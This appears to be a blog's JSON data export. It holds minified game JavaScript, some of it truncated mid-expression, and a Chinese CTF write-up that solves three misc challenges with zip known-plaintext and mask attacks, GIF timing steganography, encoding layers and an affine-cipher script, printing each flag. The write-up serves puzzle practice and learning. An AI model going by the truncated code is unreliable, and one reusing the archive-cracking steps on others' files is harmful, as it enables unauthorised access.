e.neighbours.forEach(function (n) { null === n || n.isEdge || n.isWall || n.distance > e.distance + 1 && (n.distance = e.distance + 1, t.indexOf(n) < 0 && t.push(n)) }) }; t.length > 0;) e() }, t.prototype.toString = function () { for (var t = [], e = 0; e < this.h; e++) { for (var n = [], o = 0; o < this.w; o++) { var r = this.getBlock(o, e); r.isWall ? n.push(\"*\") : r.distance === 1 / 0 ? n.push(\"-\") : n.push(r.distance) } var i = n.join(\" \"); 1 == (1 & e) && (i = \" \" + i), t.push(i) } return t.join(\"\\n\") }, t.prototype.toString2 = function () { for (var t = [], e = 0; e < this.h; e++) { for (var n = [], o = 0; o < this.w; o++) { var r = this.getBlock(o, e); r.isWall ? n.push(\"*\") : r.routesCount === 1 / 0 ? n.push(\"-\") : n.push(r.routesCount) } var i = n.join(\" \"); 1 == (1 & e) && (i = \" \" + i), t.push(i) } return t.join(\"\\n\") }, t }(); e.nearestSolver = function (t, e, n) { var o = new i(t); o.calcAllDistances(); var r = o.getBlock(e, n).directions; return r.length > 0 ? r[0] : -1 }, e.default = function (t, e, n) { var o = new i(t); return o.calcAllDistances(), o.getBlock(e, n).direction } }, function (t, e, n) { \"use strict\"; var o, r = this && this.__extends || (o = function (t, e) { return (o = Object.setPrototypeOf || { __proto__: [] } instanceof Array && function (t, e) { t.__proto__ = e } || function (t, e) { for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]) })(t, e) }, function (t, e) { function n() { this.constructor = t } o(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n) }); Object.defineProperty(e, \"__esModule\", { value: !0 }); var i = n(28), s = function (t) { function e(e, n, o, r) { var i = t.call(this, e, n, void 0, r) || this; return i.rawData = o, i } return r(e, t), e.prototype.load = function () { this.state === Phaser.Loader.FILE_POPULATED ? this.loader.nextFile(this, !0) : this.xhrLoader = i.default(this, this.loader.xhr) }, e }(Phaser.Loader.FileTypes.SVGFile); e.default = s }, function (t, e, n) { \"use strict\"; Object.defineProperty(e, \"__esModule\", { value: !0 }); var o = n(29); e.default = function (t, e) { var n = new o.default; return n.open(\"GET\", t.src, e.async, e.user, e.password), n.responseType = t.xhrSettings.responseType, n.timeout = e.timeout, e.header && e.headerValue && n.setRequestHeader(e.header, e.headerValue), e.requestedWith && n.setRequestHeader(\"X-Requested-With\", e.requestedWith), e.overrideMimeType && n.overrideMimeType(e.overrideMimeType), n.onload = t.onLoad.bind(t, n), n.onerror = t.onError.bind(t), n.onprogress = t.onProgress.bind(t), n.send(), setTimeout(function () { n.respond(200, { \"Content-Type\": \"application/octet-stream\" }, t.rawData) }, 1), n } }, function (t, e, n) { \"use strict\"; n.r(e); /** * Minimal Event interface implementation * * Original implementation by Sven Fuchs: https://gist.github.com/995028 * Modifications and tests by Christian Johansen. * * @author Sven Fuchs (svenfuchs@artweb-design.de) * @author Christian Johansen (christian@cjohansen.no) * @license BSD * * Copyright (c) 2011 Sven Fuchs, Christian Johansen */ var o = function (t, e, n, o) { this.type = t, this.bubbles = e, this.cancelable = n, this.target = o }; o.prototype = { stopPropagation: function () {}, preventDefault: function () { this.defaultPrevented = !0 } }; var r = { 100: \"Continue\", 101: \"Switching Protocols\", 200: \"OK\", 201: \"Created\", 202: \"Accepted\", 203: \"Non-Authoritative Information\", 204: \"No Content\", 205: \"Reset Content\", 206: \"Partial Content\", 300: \"Multiple Choice\", 301: \"Moved Permanently\", 302: \"Found\", 303: \"See Other\", 304: \"Not Modified\", 305: \"Use Proxy\", 307: \"Temporary Redirect\", 400: \"Bad Request\", 401: \"Unauthorized\", 402: \"Payment Required\", 403: \"Forbidden\", 404: \"Not Found\", 405: \"Method Not Allowed\", 406: \"Not Acceptable\", 407: \"Proxy Authentication Required\", 408: \"Request Timeout\", 409: \"Conflict\", 410: \"Gone\", 411: \"Length Required\", 412: \"Precondition Failed\", 413: \"Request Entity Too Large\", 414: \"Request-URI Too Long\", 415: \"Unsupported Media Type\", 416: \"Requested Range Not Satisfiable\", 417: \"Expectation Failed\", 422: \"Unprocessable Entity\", 500: \"Internal Server Error\", 501: \"Not Implemented\", 502: \"Bad Gateway\", 503: \"Service Unavailable\", 504: \"Gateway Timeout\", 505: \"HTTP Version Not Supported\" }; var i = { \"Accept-Charset\": !0, \"Accept-Encoding\": !0, Connection: !0, \"Content-Length\": !0, Cookie: !0, Cookie2: !0, \"Content-Transfer-Encoding\": !0, Date: !0, Expect: !0, Host: !0, \"Keep-Alive\": !0, Referer: !0, TE: !0, Trailer: !0, \"Transfer-Encoding\": !0, Upgrade: !0, \"User-Agent\": !0, Via: !0 }; function s(t, e) { e.addEventListener(t, function (n) { var o = e[\"on\" + t]; o && \"function\" == typeof o && o.call(n.target, n) }) } function a() { this._eventListeners = {}; for (var t = [\"loadstart\", \"progress\", \"load\", \"abort\", \"loadend\"], e = t.length - 1; e >= 0; e--) s(t[e], this) } function l() { a.call(this), this.readyState = l.UNSENT, this.requestHeaders = {}, this.requestBody = null, this.status = 0, this.statusText = \"\", this.upload = new a } a.prototype = { addEventListener: function (t, e) { this._eventListeners[t] = this._eventListeners[t] || [], this._eventListeners[t].push(e) }, removeEventListener: function (t, e) { for (var n = this._eventListeners[t] || [], o = 0, r = n.length; o < r; ++o) if (n[o] == e) return n.splice(o, 1) }, dispatchEvent: function (t) { for (var e = t.type, n = this._eventListeners[e] || [], o = 0; o < n.length; o++) \"function\" == typeof n[o] ? n[o].call(this, t) : n[o].handleEvent(t); return !!t.defaultPrevented }, _progress: function (t, e, n) { var r = new o(\"progress\"); r.target = this, r.lengthComputable = t, r.loaded = e, r.total = n, this.dispatchEvent(r) } }, l.prototype = new a, l.UNSENT = 0, l.OPENED = 1, l.HEADERS_RECEIVED = 2, l.LOADING = 3, l.DONE = 4; var d = { UNSENT: 0, OPENED: 1, HEADERS_RECEIVED: 2, LOADING: 3, DONE: 4, async: !0, withCredentials: !1, open: function (t, e, n, o, r) { this.method = t, this.url = e, this.async = \"boolean\" != typeof n || n, this.username = o, this.password = r, this.responseText = null, this.responseXML = null, this.responseURL = e, this.requestHeaders = {}, this.sendFlag = !1, this._readyStateChange(l.OPENED) }, setRequestHeader: function (t, e) { if (u(this), i[t] || /^(Sec-|Proxy-)/.test(t)) throw new Error('Refused to set unsafe header \"' + t + '\"'); this.requestHeaders[t] ? this.requestHeaders[t] += \",\" + e : this.requestHeaders[t] = e }, send: function (t) { if (u(this), !/^(get|head)$/i.test(this.method)) { var e = !1; Object.keys(this.requestHeaders).forEach(function (t) { \"content-type\" === t.toLowerCase() && (e = !0) }), e || (t || \"\").toString().match(\"FormData\") || (this.requestHeaders[\"Content-Type\"] = \"text/plain;charset=UTF-8\"), this.requestBody = t } this.errorFlag = !1, this.sendFlag = this.async, this._readyStateChange(l.OPENED), \"function\" == typeof this.onSend && this.onSend(this), this.dispatchEvent(new o(\"loadstart\", !1, !1, this)) }, abort: function () { this.aborted = !0, this.responseText = null, this.errorFlag = !0, this.requestHeaders = {}, this.dispatchEvent(new o(\"abort\", !1, !1, this)), this.readyState > l.UNSENT && this.sendFlag && (this._readyStateChange(l.UNSENT), this.sendFlag = !1), \"function\" == typeof this.onerror && this.onerror() }, getResponseHeader: function (t) { if (this.readyState < l.HEADERS_RECEIVED) return null; if (/^Set-Cookie2?$/i.test(t)) return null; for (var e in t = t.toLowerCase(), this.responseHeaders) if (e.toLowerCase() == t) return this.responseHeaders[e]; return null }, getAllResponseHeaders: function () { if (this.readyState < l.HEADERS_RECEIVED) return \"\"; var t = \"\"; for (var e in this.responseHeaders) this.responseHeaders.hasOwnProperty(e) && !/^Set-Cookie2?$/i.test(e) && (t += e + \": \" + this.responseHeaders[e] + \"\\r\\n\"); return t }, overrideMimeType: function (t) { \"string\" == typeof t && (this.forceMimeType = t.toLowerCase()) }, _readyStateChange: function (t) { this.readyState = t, \"function\" == typeof this.onreadystatechange && this.onreadystatechange(new o(\"readystatechange\")), this.dispatchEvent(new o(\"readystatechange\")), this.readyState == l.DONE && this.dispatchEvent(new o(\"load\", !1, !1, this)), this.readyState != l.UNSENT && this.readyState != l.DONE || this.dispatchEvent(new o(\"loadend\", !1, !1, this)) }, _setResponseHeaders: function (t) { for (var e in this.responseHeaders = {}, t) t.hasOwnProperty(e) && (this.responseHeaders[e] = t[e]); this.forceMimeType && (this.responseHeaders[\"Content-Type\"] = this.forceMimeType), this.async ? this._readyStateChange(l.HEADERS_RECEIVED) : this.readyState = l.HEADERS_RECEIVED }, _setResponseBody: function (t) { ! function (t) { if (t.readyState == l.DONE) throw new Error(\"Request done\") }(this), function (t) { if (t.async && t.readyState != l.HEADERS_RECEIVED) throw new Error(\"No headers received\") }(this), function (t) { if (\"string\" != typeof t) { var e = new Error(\"Attempted to respond to fake XMLHttpRequest with \" + t + \", which is not a string.\"); throw e.name = \"InvalidBodyException\", e } }(t); var e = this.chunkSize || 10, n = 0; this.responseText = \"\"; do { this.async && this._readyStateChange(l.LOADING), this.responseText += t.substring(n, n + e), n += e } while (n < t.length); var o, r, i = this.getResponseHeader(\"Content-Type\"); if (this.responseText && (!i || /(text\\/xml)|(application\\/xml)|(\\+xml)/.test(i))) try { this.responseXML = (o = this.responseText, \"undefined\" != typeof DOMParser ? r = (new DOMParser).parseFromString(o, \"text/xml\") : ((r = new ActiveXObject(\"Microsoft.XMLDOM\")).async = \"false\", r.loadXML(o)), r) } catch (t) {} this.async ? this._readyStateChange(l.DONE) : this.readyState = l.DONE }, respond: function (t, e, n) { this._setResponseHeaders(e || {}), this.status = \"number\" == typeof t ? t : 200, this.statusText = r[this.status], this._setResponseBody(n || \"\") } }; for (var h in d) l.prototype[h] = d[h]; function u(t) { if (t.readyState !== l.OPENED) throw new Error(\"INVALID_STATE_ERR\"); if (t.sendFlag) throw new Error(\"INVALID_STATE_ERR\") } e.default = l } ]);"},{"title":"","date":"2020-11-28T15:10:17.672Z","updated":"2020-05-11T02:15:40.945Z","comments":true,"path":"game简单版/phaser.min.js","permalink":"https://flag2020.top/game%E7%AE%80%E5%8D%95%E7%89%88/phaser.min.js","excerpt":"","text":"!function(t,e){\"object\"==typeof exports&&\"object\"==typeof module?module.exports=e():\"function\"==typeof define&&define.amd?define(\"Phaser\",[],e):\"object\"==typeof exports?exports.Phaser=e():t.Phaser=e()}(window,function(){return function(t){var e={};function i(n){if(e[n])return e[n].exports;var s=e[n]={i:n,l:!1,exports:{}};return t[n].call(s.exports,s,s.exports,i),s.l=!0,s.exports}return i.m=t,i.c=e,i.d=function(t,e,n){i.o(t,e)||Object.defineProperty(t,e,{configurable:!1,enumerable:!0,get:n})},i.r=function(t){Object.defineProperty(t,\"__esModule\",{value:!0})},i.n=function(t){var e=t&&t.__esModule?function(){return t.default}:function(){return t};return i.d(e,\"a\",e),e},i.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},i.p=\"\",i(i.s=1360)}([function(t,e){function i(t,e,i){var n=i?t[e]:Object.getOwnPropertyDescriptor(t,e);return!i&&n.value&&\"object\"==typeof n.value&&(n=n.value),!(!n||!function(t){return!!t.get&&\"function\"==typeof t.get||!!t.set&&\"function\"==typeof t.set}(n))&&(void 0===n.enumerable&&(n.enumerable=!0),void 0===n.configurable&&(n.configurable=!0),n)}function n(t,e){var i=Object.getOwnPropertyDescriptor(t,e);return!!i&&(i.value&&\"object\"==typeof i.value&&(i=i.value),!1===i.configurable)}function s(t,e,s,r){for(var a in e)if(e.hasOwnProperty(a)){var h=i(e,a,s);if(!1!==h){if(n((r||t).prototype,a)){if(o.ignoreFinals)continue;throw new Error(\"cannot override final property '\"+a+\"', set Class.ignoreFinals = true to skip\")}Object.defineProperty(t.prototype,a,h)}else t.prototype[a]=e[a]}}function r(t,e){if(e){Array.isArray(e)||(e=[e]);for(var i=0;i>8|0))/255,(255&(0|t))/255]},getComponentCount:function(t,e){for(var i=0,n=0;n"},{"title":"","date":"2020-11-28T15:12:34.890Z","updated":"2020-11-28T15:04:52.001Z","comments":true,"path":"game/phaser.min.js","permalink":"https://flag2020.top/game/phaser.min.js","excerpt":"","text":"! function (t, e) { \"object\" == typeof exports && \"object\" == typeof module ? module.exports = e() : \"function\" == typeof define && define.amd ? define(\"Phaser\", [], e) : \"object\" == typeof exports ? exports.Phaser = e() : t.Phaser = e() }(window, function () { return function (t) { var e = {}; function i(n) { if (e[n]) return e[n].exports; var s = e[n] = { i: n, l: !1, exports: {} }; return t[n].call(s.exports, s, s.exports, i), s.l = !0, s.exports } return i.m = t, i.c = e, i.d = function (t, e, n) { i.o(t, e) || Object.defineProperty(t, e, { configurable: !1, enumerable: !0, get: n }) }, i.r = function (t) { Object.defineProperty(t, \"__esModule\", { value: !0 }) }, i.n = function (t) { var e = t && t.__esModule ? function () { return t.default } : function () { return t }; return i.d(e, \"a\", e), e }, i.o = function (t, e) { return Object.prototype.hasOwnProperty.call(t, e) }, i.p = \"\", i(i.s = 1360) }([ function (t, e) { function i(t, e, i) { var n = i ? t[e] : Object.getOwnPropertyDescriptor(t, e); return !i && n.value && \"object\" == typeof n.value && (n = n.value), !(!n || ! function (t) { return !!t.get && \"function\" == typeof t.get || !!t.set && \"function\" == typeof t.set }(n)) && (void 0 === n.enumerable && (n.enumerable = !0), void 0 === n.configurable && (n.configurable = !0), n) } function n(t, e) { var i = Object.getOwnPropertyDescriptor(t, e); return !!i && (i.value && \"object\" == typeof i.value && (i = i.value), !1 === i.configurable) } function s(t, e, s, r) { for (var a in e) if (e.hasOwnProperty(a)) { var h = i(e, a, s); if (!1 !== h) { if (n((r || t).prototype, a)) { if (o.ignoreFinals) continue; throw new Error(\"cannot override final property '\" + a + \"', set Class.ignoreFinals = true to skip\") } Object.defineProperty(t.prototype, a, h) } else t.prototype[a] = e[a] } } function r(t, e) { if (e) { Array.isArray(e) || (e = [e]); for (var i = 0; i < e.length; i++) s(t, e[i].prototype || e[i]) } } function o(t) { var e, i; if (t || (t = {}), t.initialize) { if (\"function\" != typeof t.initialize) throw new Error(\"initialize must be a function\"); e = t.initialize, delete t.initialize } else if (t.Extends) { var n = t.Extends; e = function () { n.apply(this, arguments) } } else e = function () {}; t.Extends ? (e.prototype = Object.create(t.Extends.prototype), e.prototype.constructor = e, i = t.Extends, delete t.Extends) : e.prototype.constructor = e; var o = null; return t.Mixins && (o = t.Mixins, delete t.Mixins), r(e, o), s(e, t, !0, i), e } o.extend = s, o.mixin = r, o.ignoreFinals = !1, t.exports = o }, function (t, e) { t.exports = function () {} }, function (t, e) { t.exports = function (t, e, i) { var n = typeof t; return t && \"number\" !== n && \"string\" !== n && t.hasOwnProperty(e) && void 0 !== t[e] ? t[e] : i } }, function (t, e, i) { var n = new(i(0))({ initialize: function (t, e) { this.x = 0, this.y = 0, \"object\" == typeof t ? (this.x = t.x || 0, this.y = t.y || 0) : (void 0 === e && (e = t), this.x = t || 0, this.y = e || 0) }, clone: function () { return new n(this.x, this.y) }, copy: function (t) { return this.x = t.x || 0, this.y = t.y || 0, this }, setFromObject: function (t) { return this.x = t.x || 0, this.y = t.y || 0, this }, set: function (t, e) { return void 0 === e && (e = t), this.x = t, this.y = e, this }, setTo: function (t, e) { return this.set(t, e) }, setToPolar: function (t, e) { return null == e && (e = 1), this.x = Math.cos(t) * e, this.y = Math.sin(t) * e, this }, equals: function (t) { return this.x === t.x && this.y === t.y }, angle: function () { var t = Math.atan2(this.y, this.x); return t < 0 && (t += 2 * Math.PI), t }, add: function (t) { return this.x += t.x, this.y += t.y, this }, subtract: function (t) { return this.x -= t.x, this.y -= t.y, this }, multiply: function (t) { return this.x *= t.x, this.y *= t.y, this }, scale: function (t) { return isFinite(t) ? (this.x *= t, this.y *= t) : (this.x = 0, this.y = 0), this }, divide: function (t) { return this.x /= t.x, this.y /= t.y, this }, negate: function () { return this.x = -this.x, this.y = -this.y, this }, distance: function (t) { var e = t.x - this.x, i = t.y - this.y; return Math.sqrt(e * e + i * i) }, distanceSq: function (t) { var e = t.x - this.x, i = t.y - this.y; return e * e + i * i }, length: function () { var t = this.x, e = this.y; return Math.sqrt(t * t + e * e) }, lengthSq: function () { var t = this.x, e = this.y; return t * t + e * e }, normalize: function () { var t = this.x, e = this.y, i = t * t + e * e; return i > 0 && (i = 1 / Math.sqrt(i), this.x = t * i, this.y = e * i), this }, normalizeRightHand: function () { var t = this.x; return this.x = -1 * this.y, this.y = t, this }, dot: function (t) { return this.x * t.x + this.y * t.y }, cross: function (t) { return this.x * t.y - this.y * t.x }, lerp: function (t, e) { void 0 === e && (e = 0); var i = this.x, n = this.y; return this.x = i + e * (t.x - i), this.y = n + e * (t.y - n), this }, transformMat3: function (t) { var e = this.x, i = this.y, n = t.val; return this.x = n[0] * e + n[3] * i + n[6], this.y = n[1] * e + n[4] * i + n[7], this }, transformMat4: function (t) { var e = this.x, i = this.y, n = t.val; return this.x = n[0] * e + n[4] * i + n[12], this.y = n[1] * e + n[5] * i + n[13], this }, reset: function () { return this.x = 0, this.y = 0, this } }); n.ZERO = new n, n.RIGHT = new n(1, 0), n.LEFT = new n(-1, 0), n.UP = new n(0, -1), n.DOWN = new n(0, 1), n.ONE = new n(1, 1), t.exports = n }, function (t, e) { t.exports = function (t, e, i) { if (t && \"number\" != typeof t) { if (t.hasOwnProperty(e)) return t[e]; if (-1 !== e.indexOf(\".\")) { for (var n = e.split(\".\"), s = t, r = i, o = 0; o < n.length; o++) { if (!s.hasOwnProperty(n[o])) { r = i; break } r = s[n[o]], s = s[n[o]] } return r } return i } return i } }, function (t, e, i) { var n = i(0), s = i(17), r = i(16), o = new n({ initialize: function (t) { this.scene = t, this.systems = t.sys, this.displayList, this.updateList, t.sys.events.once(r.BOOT, this.boot, this), t.sys.events.on(r.START, this.start, this) }, boot: function () { this.displayList = this.systems.displayList, this.updateList = this.systems.updateList, this.systems.events.once(r.DESTROY, this.destroy, this) }, start: function () { this.systems.events.once(r.SHUTDOWN, this.shutdown, this) }, existing: function (t) { return (t.renderCanvas || t.renderWebGL) && this.displayList.add(t), t.preUpdate && this.updateList.add(t), t }, shutdown: function () { this.systems.events.off(r.SHUTDOWN, this.shutdown, this) }, destroy: function () { this.shutdown(), this.scene.sys.events.off(r.START, this.start, this), this.scene = null, this.systems = null, this.displayList = null, this.updateList = null } }); o.register = function (t, e) { o.prototype.hasOwnProperty(t) || (o.prototype[t] = e) }, s.register(\"GameObjectFactory\", o, \"add\"), t.exports = o }, function (t, e, i) { var n = new(i(0))({ initialize: function (t, e) { void 0 === t && (t = 0), void 0 === e && (e = t), this.x = t, this.y = e }, setTo: function (t, e) { return void 0 === t && (t = 0), void 0 === e && (e = t), this.x = t, this.y = e, this } }); t.exports = n }, function (t, e) { var i = {}, n = { install: function (t) { for (var e in i) t[e] = i[e] }, register: function (t, e) { i[t] = e }, destroy: function () { i = {} } }; t.exports = n }, function (t, e) { t.exports = function (t) { if (\"object\" != typeof t || t.nodeType || t === t.window) return !1; try { if (t.constructor && !{}.hasOwnProperty.call(t.constructor.prototype, \"isPrototypeOf\")) return !1 } catch (t) { return !1 } return !0 } }, function (t, e) { t.exports = { getTintFromFloats: function (t, e, i, n) { return ((255 & (255 * n | 0)) < 24 | (255 & (255 * t | 0)) < 16 | (255 & (255 * e | 0)) < 8 | 255 & (255 * i | 0)) >>> 0 }, getTintAppendFloatAlpha: function (t, e) { return ((255 & (255 * e | 0)) < 24 | t) >>> 0 }, getTintAppendFloatAlphaAndSwap: function (t, e) { return ((255 & (255 * e | 0)) < 24 | (255 & (0 | t)) < 16 | (255 & (t >> 8 | 0)) < 8 | 255 & (t >> 16 | 0)) >>> 0 }, getFloatsFromUintRGB: function (t) { return [(255 & (t >> 16 | 0)) / 255, (255 & (t >> 8 | 0)) / 255, (255 & (0 | t)) / 255] }, getComponentCount: function (t, e) { for (var i = 0, n = 0; n < t.length; ++n) { var s = t[n]; s.type === e.FLOAT ? i += s.size : i += 1 } return i } } }, function (t, e, i) { var n = i(0), s = i(42), r = i(204), o = i(430), a = i(59), h = i(201), l = new n({ initialize: function (t, e, i, n) { void 0 === t && (t = 0), void 0 === e && (e = 0), void 0 === i && (i = 0), void 0 === n && (n = 0), this.x = t, this.y = e, this.width = i, this.height = n }, contains: function (t, e) { return s(this, t, e) }, getPoint: function (t, e) { return r(this, t, e) }, getPoints: function (t, e, i) { return o(this, t, e, i) }, getRandomPoint: function (t) { return h(this, t) }, setTo: function (t, e, i, n) { return this.x = t, this.y = e, this.width = i, this.height = n, this }, setEmpty: function () { return this.setTo(0, 0, 0, 0) }, setPosition: function (t, e) { return void 0 === e && (e = t), this.x = t, this.y = e, this }, setSize: function (t, e) { return void 0 === e && (e = t), this.width = t, this.height = e, this }, isEmpty: function () { return this.width"}],"posts":[{"title":"复现3道misc题","slug":"复现3道misc题","date":"2020-12-21T16:00:00.000Z","updated":"2020-12-23T14:33:26.730Z","comments":true,"path":"2020/12/22/复现3道misc题/","link":"","permalink":"https://flag2020.top/2020/12/22/%E5%A4%8D%E7%8E%B03%E9%81%93misc%E9%A2%98/","excerpt":"目录 CISCN 2020 复赛(华南赛区) —— hidden_secret 安洵杯 2019 —— easy misc SWPUCTF 2020 —— 耗子尾汁","text":"目录 CISCN 2020 复赛(华南赛区) —— hidden_secret 安洵杯 2019 —— easy misc SWPUCTF 2020 —— 耗子尾汁 hidden_secret题目：CISCN 2020 复赛（华南赛区） 参考：CISCN 复赛(华南赛区)部分wp - 迷失的老鼠 - 博客园 (cnblogs.com) 文件：flag1.zip flag1.zip解压出来是一张图片（hahah.jpg）和一个压缩包（hidden_secret.zip） 图片好像没什么东西，压缩包解密需要密码 打开hidden_secret.zip，发现加密的文件里面也有hahah.jpg，而且crc校验值一样 用ARCHPR进行明文攻击 拿到了hidden_secret.zip的解压密码： 1pb-1&#96;;ks 解压后又是那个狗头，还有个hidden_secret.rar，继续解压 得到key.gif 中途看到有一帧有二维码 用PS打开，在图层34查看图层 扫码得到： 1flag&#123;ni_chou_sha&#125; 提交后发现不对😡 用stegsolve分析图像信息，可以发现这个gif动图的间隔时间分为10和20两种，考虑gif时间隐写 将所有间隔时间分离出来 1identify -format &quot;%T&quot; key.gif 得到 11020201020201020102010101020101010102020102010201020102020202020102020101020201010202020101020201020202010201010 将10转化为0，20转化为1 12345678&lt;?php$a = &quot;1020201020201020102010101020101010102020102010201020102020202020102020101020201010202020101020201020202010201010&quot;;$a = str_replace(&#x27;10&#x27;, &#x27;0&#x27;, $a);$a = str_replace(&#x27;20&#x27;, &#x27;1&#x27;, $a);echo $a;?&gt; 得到 101101101010001000011010101011111011001100111001101110100 将二进制转为字符串，得到 1mD5_fst md5加密后得到 1046cb65e60a4774c76b4f99371e66f0d 根据题目提示ntfs，查看文件夹隐藏文件，在hidden_secret文件夹中发现隐藏文件 导出后重命名为1.rar 解压密码为上面的MD5 解压得到flag.txt 1flag&#123;f935c5d0470757a3d2f3ee7467366f4e&#125; easy misc题目：安洵杯 2019 参考：BUUCTF:[安洵杯 2019]easy misc_F10NA-CSDN博客 文件：attachment.rar 解压之后有三个文件（夹） decode.zip为加密文件，但有注释 1FLAG IN ((√2524921X85÷5+2)÷15-1794)+NNULLULL, 算出来是7 123&lt;?phpecho (sqrt(2524921)*85/5+2)/15-1794;?&gt; 使用掩码攻击 12019456NNULLULL, 解压后得到decode.txt，确认为字频隐写 1234567891011121314151617181920212223242526a &#x3D; dIWb &#x3D; sSDc &#x3D; adE d &#x3D; jVfe &#x3D; QW8f &#x3D; SA&#x3D;g &#x3D; jBth &#x3D; 5REi &#x3D; tRQj &#x3D; SPAk &#x3D; 8DSl &#x3D; XiEm &#x3D; S8Sn &#x3D; MkFo &#x3D; T9pp &#x3D; PS5q &#x3D; E&#x2F;Sr &#x3D; -sds &#x3D; SQWt &#x3D; obWu &#x3D; &#x2F;WSv &#x3D; SD9w &#x3D; cw&#x3D;x &#x3D; ASDy &#x3D; FTaz &#x3D; AE7 而在read文件夹里有大量txt文件，里面有个hint.txt 1hint:取前16个字符 但不知道是取哪个txt文件的前16高频字母 使用foremost分离小姐姐.png，得到 使用盲水印工具分离：盲水印合成与解密 安装不了opencv库，目前没有提取成功，据说是11.txt 对11.txt进行字频分析：http://www.aihanyu.org/cncorpus/CpsTongji.aspx 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172序号 字词 出现次数 出现频率1 17203 17.41232 e 8938 9.04673 t 6278 6.35444 a 5849 5.92025 o 5372 5.43746 n 4932 4.9927 r 4525 4.58018 h 4460 4.51439 s 4347 4.399910 i 4291 4.343211 d 3640 3.684312 l 3339 3.379613 u 2308 2.336114 y 1903 1.926215 g 1851 1.873516 w 1733 1.754117 c 1506 1.524318 m 1491 1.509119 . 1423 1.440320 f 1246 1.261221 1203 1.217622 b 1199 1.213623 , 1181 1.195424 p 1109 1.122525 k 931 0.942326 &quot; 866 0.876527 &#39; 710 0.718628 H 603 0.610329 v 592 0.599230 - 450 0.455531 D 352 0.356332 I 281 0.284433 T 250 0.25334 A 197 0.199435 P 194 0.196436 M 182 0.184237 ? 152 0.153838 S 131 0.132639 W 124 0.125540 V 119 0.120441 U 117 0.118442 O 106 0.107343 ! 96 0.097244 G 80 0.08145 E 76 0.076946 x 76 0.076947 B 74 0.074948 j 74 0.074949 Y 73 0.073950 z 73 0.073951 N 72 0.072952 C 61 0.061753 R 56 0.056754 L 55 0.055755 F 53 0.053656 q 49 0.049657 ; 32 0.032458 K 30 0.030459 : 22 0.022360 ( 14 0.014261 ) 14 0.014262 J 13 0.013263 1 5 0.005164 3 3 0.00365 4 3 0.00366 Q 3 0.00367 2 2 0.00268 Z 2 0.00269 ~ 1 0.00170 0 1 0.00171 7 1 0.001 也可以使用脚本进行字频分析 1234567891011121314151617181920import refile = open(&#x27;E:/11.txt&#x27;)line = file.readlines()file.seek(0,0)file.close()result = &#123;&#125;for i in range(97,123): count = 0 for j in line: find_line = re.findall(chr(i),j) count += len(find_line) result[chr(i)] = countres = sorted(result.items(),key=lambda item:item[1],reverse=True)num = 1for x in res: print(&#x27;频数第&#123;0&#125;: &#x27;.format(num),x) num += 1 前16高频字符为 1etaonrhsidluygw 1QW8obWdIWT9pMkF-sd5RESQWtRQjVfXiE&#x2F;WSFTajBtcw&#x3D; 编码后缀符号为=，猜测是base64 但标准base64只有64个字符（英文大小写、数字和+、/）以及用作后缀等号，并没有r=-sd的-，查了下发现题目出错了 所以是 1QW8obWdIWT9pMkFSQWtRQjVfXiE&#x2F;WSFTajBtcw&#x3D; base64解码后得到 1Ao(mgHY?i2ARAkQB5_^!?Y!Sj0ms base85解码后得到 1flag&#123;have_a_good_day1&#125; 耗子尾汁题目：SWPUCTF 2020 参考：SWPUCTF2020 Misc题解 文件：hzwz.gif binwalk提取一下，得到4个文件 flag.txt没有flag 123456789101112131415161718192021flag&#123;Th1s_1s_fa1se_f1ag&#125;上来就分离我合成的gif 这好吗？这不好！啪的一下 很快啊 我全都防住了 2^4_2^5_2^6.mp4为闪电五连鞭的视频，中间有一帧画面有东西 63E3A.zip和63F5F.zip解压出来就是2^4_2^5_2^6.mp4 1c2lnbl9pbg&#x3D;&#x3D; base64解码为 1sign_in 把2^4_2^5_2^6.mp4拖到010editor，发现文件尾有个PK开头的压缩包，复制另存为1.zip 也可以用kali自带的binwalk提取 解压需要密码，将sign_in作为密码，解压得到19_20.txt 123R1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0&#x3D;&#x2F;&#x2F;The last layer is the single table replacement password 翻译：最后一层是单表替换密码 base64解码得到 1GZBTONRXGU3DKNRZGYYTMQRXHA3TKNRUG4ZTOOJXGE3DKNRYG4ZTOQJXGE3DQNZZGZBDMNZWG43TGNZZG44TMQZWII3TMNZWGY4Q&#x3D;&#x3D;&#x3D;&#x3D; base32解码 16C76756569616B7875647379716568737A7168796B67677379796C6B767669 十六进制转字符 1lvueiakxudsyqehszqhykggsyylkvvi 19_20.txt说最后一层是单表替换密码，而仿射密码是一种表单代换密码 根据文件名，设a=19，b=20 使用脚本进行仿射密码解密 12345678910111213141516171819202122s = &quot;lvueiakxudsyqehszqhykggsyylkvvi&quot;.upper()a = 19b = 20def get(a, b): if b == 0: return 1, 0 else: k = a //b remainder = a % b x1, y1 = get(b, remainder) x, y =y1, x1 - k * y1 return x, yx, y = get(a, 26)a1 = x % 26 l= len(s)for i in range(l): cipher = a1 * (ord(s[i])- 65 - b) % 26 res=chr(cipher + 65) print(res.lower(), end=&#x27;&#x27;) 得到 1flagyouhavesignedinsuccessfully 根据题目提示：flag格式flag{xxx_xxxx_xxxxxx_xx_xxxxxxxxxxxx} 加上下划线，得到flag 1flag&#123;you_have_signed_in_successfully&#125; 附： 仿射密码解密原始脚本：仿射密码解密（Affine Cipher） 12345678910111213141516171819202122232425#仿射密码解密#改进欧几里得算法求线性方程的x与ydef get(a, b): if b == 0: return 1, 0 else: k = a //b remainder = a % b x1, y1 = get(b, remainder) x, y =y1, x1 - k * y1 return x, y s = input(&quot;请输入解密字符：&quot;).upper()a = int(input(&quot;请输入a：&quot;))b = int(input(&quot;请输入b：&quot;)) #求a关于26的乘法逆元x, y = get(a, 26)a1 = x % 26 l= len(s)for i in range(l): cipher = a1 * (ord(s[i])- 65 - b) % 26 res=chr(cipher + 65) print(res, 